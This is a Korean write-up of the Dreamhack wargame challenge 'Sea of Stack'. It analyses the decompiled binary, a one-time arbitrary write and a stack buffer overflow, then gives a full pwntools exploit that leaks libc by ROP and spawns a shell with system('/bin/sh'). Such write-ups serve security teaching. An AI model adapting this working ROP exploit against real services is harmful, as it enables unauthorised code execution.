---
title: "Sea of Stack writeup"
date: 2026-04-22 20:30:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, rop, bof, stack-pivot, dreamhack]
---

## Analysis

### checksec
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source Code
```c
...
.data:000000000040400E                 db    0
.data:000000000040400F                 db    0
.data:0000000000404010                 public safe
.data:0000000000404010 ; __int64 (__fastcall *safe)()
.data:0000000000404010 safe            dq offset safe_func     ; DATA XREF: main+AF↑r
.data:0000000000404018                 public unsafe
.data:0000000000404018 ; __int64 (__fastcall *unsafe)()
.data:0000000000404018 unsafe          dq offset unsafe_func   ; DATA XREF: main+C5↑r
...

int print_menu()
{
  puts("Sea of Stack");
  puts("1. safe func");
  puts("2. unsafe func");
  return printf("> ");
}

__int64 __fastcall read_input(__int64 a1, int a2)
{
  char buf; // [rsp+17h] [rbp-9h] BYREF
  int v4; // [rsp+18h] [rbp-8h]
  int v5; // [rsp+1Ch] [rbp-4h]

  v5 = 0;
  do
  {
    v4 = read(0, &buf, 1u);
    if ( v4 < 0 )
    {
      fwrite("read error!\n", 1u, 0xCu, stderr);
      exit(1);
    }
    *(_BYTE *)(a1 + v5++) = buf;
  }
  while ( v5 != a2 );
  if ( *(_BYTE *)(v5 - 1LL + a1) == 10 )
    *(_BYTE *)(v5 - 1LL + a1) = 0;
  return (unsigned int)v4;
}

__int64 read_number()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+1Ch] [rbp-4h]

  v2 = read(0, buf, 0xEu);
  if ( v2 < 0 )
  {
    fwrite("read error!\n", 1u, 0xCu, stderr);
    exit(1);
  }
  return (unsigned int)atoi(buf);
}

void *safe_func()
{
  _BYTE s[48]; // [rsp+0h] [rbp-30h] BYREF

  read_input((__int64)s, 41);
  return memset(s, 0, 0x28u);
}

__int64 unsafe_func()
{
  _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

  return read_input((__int64)v1, 0x10000);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-30h] BYREF
  _QWORD *v5; // [rsp+8h] [rbp-28h] BYREF
  char s1[28]; // [rsp+10h] [rbp-20h] BYREF
  int number; // [rsp+2Ch] [rbp-4h]

  proc_init(argc, argv, envp);
  printf("If you really want to give me a present, bring me that kind detective's heart.\n> ");
  read_input(s1, 16);
  if ( !strcmp(s1, "Decision2Solve") && !gotPresent )
  {
    read_input(&v5, 8);
    read_input(&v4, 6);
    *v5 = v4;
    gotPresent = 1;
  }
  print_menu();
  number = read_number();
  if ( number == 1 )
  {
    safe();
  }
  else if ( number == 2 )
  {
    unsafe();
  }
  return 0;
}
```

## Vulnerability Analysis

코드를 살펴보면 첫 입력에 `"Decision2Solve"`를 입력하면 1회 한정으로 임의의 주소에 6바이트를 쓸 수 있는 기회가 주어진다. 또한 `safe`, `unsafe`가 함수 포인터이고 각각 `safe_func`, `unsafe_func`로 초기화된 것을 확인할 수 있다. `unsafe_func`에는 스택 BOF 취약점이 존재한다.

이 바이너리에는 `get_shell` 같은 함수가 없으므로 쉘을 얻기 위해 우선 libc base를 유출해야 한다. libc를 유출하는 방법으로는 `main`의 ret에 있는 `__libc_start_call_main`을 유출하거나, No PIE이므로 주소가 이미 해결된 GOT 엔트리를 출력하는 방법을 쓸 수 있다. `unsafe_func`에 BOF 취약점이 존재하고 `print_menu`에서 `puts`를 사용하고 있으니, `puts@plt`를 이용해 ROP으로 libc base를 유출한 후 ret2main하고, 구한 libc base를 통해 쉘을 획득하도록 다시 ROP을 구성하면 된다. 이를 위해 바이너리에 `rdi` 가젯이 있어야 한다.

```
root@a237909c5b9c:/pwn/sea_of_stack# ROPgadget --binary prob --re "pop rdi"
Gadgets information
============================================================
0x000000000040129b : pop rdi ; nop ; pop rbp ; ret

Unique gadgets found: 1
```

`rdi` 가젯이 존재한다.

그러나 중요한 문제가 하나 있다. `read_input`은 두 번째 인자로 주어진 카운트 값만큼 반드시 반복한다. `unsafe_func`에서는 `read_input`을 호출할 때 카운트 값을 `0x10000`으로 넘기고 있다. `main` 함수가 libc 초기화 함수에 의해 처음 호출될 때까지 구성된 모든 스택 프레임을 합쳐도 이 크기에는 턱없이 부족하다. 따라서 스택의 끝을 넘어 할당되지 않은 공간을 건드리게 되어 SEGFAULT가 발생한다.

이를 해결하는 방법은 스택 프레임을 충분히 쌓아서 스택 포인터를 내려놓아, `0x10000`만큼 접근해도 여전히 스택 페이지 안에 있도록 만드는 것이다. 앞서 말한 임의 주소 6바이트 쓰기를 활용하면 된다. No PIE이므로 `safe` 함수 포인터가 저장된 주소에 `main`의 주소를 덮어쓰면, `safe`가 호출될 때마다 `main`이 재귀적으로 호출되면서 스택 프레임이 계속 쌓인다. `main` 함수의 어셈블리를 살펴보자.

```
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401446 <+0>:     endbr64 
   0x000000000040144a <+4>:     push   rbp
   0x000000000040144b <+5>:     mov    rbp,rsp
   0x000000000040144e <+8>:     sub    rsp,0x30
   ...
```

스택 프레임 크기가 64바이트임을 확인할 수 있다. `64 * 1024 = 0x10000`이므로, 대략 호출을 1024번 정도 반복하면 된다.

주의할 점으로 `puts`, `printf` 등은 내부적으로 SIMD 명령어를 사용하여 최적화하므로 스택 16바이트 정렬이 요구된다. `puts`를 호출할 때는 정렬이 맞아 문제없지만, ret2main으로 다시 `main`이 실행될 때 `printf`가 호출되는 시점에서 정렬이 깨진다. 따라서 첫 번째 페이로드를 구성할 때 `ret` 가젯으로 정렬을 맞춰줘야 한다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14657)

    return r


def main():
    r = conn()

    r.sendafter(b"> ", b"Decision2Solve\x00\x00")
    r.send(p64(exe.symbols["safe"]))
    r.send(p64(exe.symbols["main"])[:-2])
    r.sendafter(b"> ", b"1")

    for i in range(1023):
        r.sendlineafter(b"> ", b"A"*15)
        r.sendafter(b"> ", b"1")

    payload = b"A" * 0x20
    payload += b"B" * 0x8
    payload += p64(0x40129b)                        # 0x000000000040129b : pop rdi ; nop ; pop rbp ; ret
    payload += p64(exe.got["printf"])
    payload += b"A" * 0x8
    payload += p64(0x40101a)                        # ret
    payload += p64(exe.plt["puts"])
    payload += p64(exe.symbols["main"])
    payload += b"A" * (0x10000 - len(payload))

    r.sendlineafter(b"> ", b"A"*15)
    r.sendafter(b"> ", b"2")
    sleep(0.5)
    r.send(payload)

    printf = u64(r.recvn(6).ljust(8, b"\x00"))
    libc.address = printf - libc.symbols["printf"]

    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    payload2 = b"A" * 0x20
    payload2 += b"B" * 0x8
    payload2 += p64(0x40129b)
    payload2 += p64(binsh)
    payload2 += b"A" * 0x8
    payload2 += p64(system)
    payload2 += b"A" * (0x10000 - len(payload2))

    r.sendlineafter(b"> ", b"A"*15)
    r.sendafter(b"> ", b"2")
    sleep(0.5)
    r.send(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
```